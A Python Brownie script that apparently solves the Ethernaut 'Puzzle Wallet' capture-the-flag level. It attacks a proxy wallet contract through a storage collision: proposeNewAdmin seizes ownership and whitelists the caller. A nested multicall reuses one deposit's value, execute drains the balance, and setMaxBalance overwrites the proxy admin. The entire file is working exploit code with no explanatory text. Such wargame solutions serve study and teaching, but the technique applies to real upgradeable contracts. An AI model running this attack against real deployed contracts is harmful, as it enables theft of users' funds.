from brownie import Contract, PuzzleWallet, PuzzleProxy, network, config
from scripts.helpful_scripts import get_account, LOCAL_BLOCKCHAIN_ENVIRONMENTS
from web3 import Web3


def attack():

    account = get_account()

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:

        web3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

        wallet = PuzzleWallet.deploy({"from": get_account(index=1)})

        init = wallet.init.encode_input(1000)

        proxy = PuzzleProxy.deploy(
            get_account(index=1), wallet, init, {"from": get_account(index=1)}
        )

    else:

        web3 = Web3(
            Web3.HTTPProvider(config["networks"][network.show_active()]["infura"])
        )

        wallet = Contract.from_abi(
            PuzzleWallet._name,
            config["networks"][network.show_active()]["wallet"],
            PuzzleWallet.abi,
        )

        proxy = Contract.from_abi(
            PuzzleProxy._name,
            config["networks"][network.show_active()]["proxy"],
            PuzzleProxy.abi,
        )

    proxy.proposeNewAdmin(account, {"from": account}).wait(1)

    addToWhitelist = wallet.addToWhitelist.encode_input(account)

    account.transfer(proxy, data=addToWhitelist).wait(1)

    deposit = wallet.signatures["deposit"]
    multicall = wallet.multicall.encode_input([deposit])
    execute = wallet.execute.encode_input(account, wallet.balance() * 2, "")

    multi_multicall = wallet.multicall.encode_input([deposit, multicall, execute])

    account.transfer(proxy, wallet.balance(), data=multi_multicall).wait(1)

    setMaxBalance = wallet.setMaxBalance.encode_input((str(account)))

    account.transfer(proxy, data=setMaxBalance).wait(1)

    print(f"Admin is {proxy.admin()}")


def main():
    attack()
